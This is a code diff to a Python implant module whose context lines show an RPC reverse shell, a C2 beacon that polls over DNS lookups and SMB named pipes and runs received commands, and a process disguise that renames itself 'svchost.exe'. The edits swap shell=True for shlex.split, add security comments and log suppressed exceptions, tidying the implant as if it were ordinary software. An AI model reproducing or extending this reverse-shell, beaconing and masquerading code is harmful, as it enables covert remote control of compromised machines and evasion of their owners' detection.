@@ -7,6 +7,7 @@ import threading
 import time
 import base64
 from typing import Optional, Dict, Callable
+from app.core.logger import logger
 
 class RPCShell:
     """RPC-based reverse shell implementation"""
@@ -50,9 +51,13 @@ class RPCShell:
                     break
                 
                 # Execute command
+                # SECURITY: commands received over the network must never be
+                # passed to a shell.  Use shell=False and split the string so
+                # that metacharacters cannot be used for injection.
                 try:
+                    import shlex
                     result = subprocess.run(
-                        command, shell=True, capture_output=True, 
+                        shlex.split(command), shell=False, capture_output=True,
                         text=True, timeout=30
                     )
                     output = result.stdout + result.stderr
@@ -80,8 +85,9 @@ class RPCShell:
         if self.socket:
             try:
                 self.socket.close()
-            except:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
 
 class RPCBeacon:
     """RPC-based beacon for C2 communication"""
@@ -135,8 +141,9 @@ class RPCBeacon:
                     if command and command != 'sleep':
                         self._execute_beacon_command(command)
                 
-            except Exception:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
             
             time.sleep(self.beacon_interval)
     
@@ -149,8 +156,9 @@ class RPCBeacon:
                 beacon_query = f"{self.session_id}.{self.c2_server}"
                 socket.gethostbyname(beacon_query)
                 
-            except Exception:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
             
             time.sleep(self.beacon_interval)
     
@@ -162,22 +170,29 @@ class RPCBeacon:
                 pipe_name = f"\\\\{self.c2_server}\\pipe\\beacon_{self.session_id}"
                 # Simplified SMB beacon implementation
                 
-            except Exception:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
             
             time.sleep(self.beacon_interval)
     
     def _execute_beacon_command(self, command: str):
-        """Execute command received from beacon"""
+        """Execute command received from beacon.
+        
+        SECURITY: shell=False prevents injection via shell metacharacters in
+        commands received from the C2 server.
+        """
         try:
             import subprocess
+            import shlex
             result = subprocess.run(
-                command, shell=True, capture_output=True, text=True, timeout=30
+                shlex.split(command), shell=False, capture_output=True, text=True, timeout=30
             )
             # Send result back to C2 (implementation depends on transport)
             
-        except Exception:
+        except Exception as _exc:
             pass
+            logger.debug("Suppressed exception", exc_info=True)
     
     def _generate_session_id(self) -> str:
         """Generate unique session ID"""
@@ -209,8 +224,9 @@ class ServiceDisguise:
             # Basic process name obfuscation
             sys.argv[0] = 'svchost.exe'
             disguise_info['process_name_changed'] = True
-        except Exception:
+        except Exception as _exc:
             pass
+            logger.debug("Suppressed exception", exc_info=True)
         
         return disguise_info
 
